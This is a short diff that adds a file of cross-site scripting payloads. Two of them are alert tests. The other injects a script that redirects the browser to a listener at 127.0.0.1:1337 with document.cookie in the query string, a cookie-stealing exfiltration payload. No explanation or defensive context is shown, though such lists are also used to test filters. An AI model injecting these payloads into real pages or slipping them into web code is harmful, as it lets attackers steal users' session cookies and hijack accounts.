@@ -1,0 +1,4 @@
+<script>alert('Hacked')</script>
+<script> window.location='https://127.0.0.1:1337/?cookie=' + document.cookie</script>
+
+<body onload="alert(document.cookie)">
